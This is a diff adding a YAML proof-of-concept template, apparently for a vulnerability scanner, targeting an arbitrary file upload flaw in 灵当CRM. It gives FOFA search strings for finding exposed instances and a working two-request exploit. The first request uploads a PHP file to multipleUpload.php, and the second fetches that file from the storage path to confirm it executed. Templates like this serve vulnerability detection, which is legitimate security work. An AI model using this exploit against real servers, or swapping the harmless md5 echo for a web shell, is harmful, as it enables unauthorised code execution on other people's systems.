@@ -1,0 +1,46 @@
+id: poc-yaml-51mis-crm-uploadimg-anyfile-upload
+info:
+  name: 灵当CRM uploadimg 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 灵当CRM
+  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
+    && body="ldcrm.base.js")
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  dt: datetime("2006")
+requests:
+- method: POST
+  path: /crm/modules/Home/multipleUpload.php?uploadtype=uploadimg
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
+  data: '------WebKitFormBoundary0Mh3BfgWszxRFokh
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: text/plain
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundary0Mh3BfgWszxRFokh
+
+    Content-Disposition: form-data; name="error"
+
+
+    UPLOAD_ERR_OK
+
+    ------WebKitFormBoundary0Mh3BfgWszxRFokh--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"path\"") &&
+
+    contains(body,".php")
+
+    '
+- method: GET
+  path: /crm/storage/{{.dt}}/February/week2/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
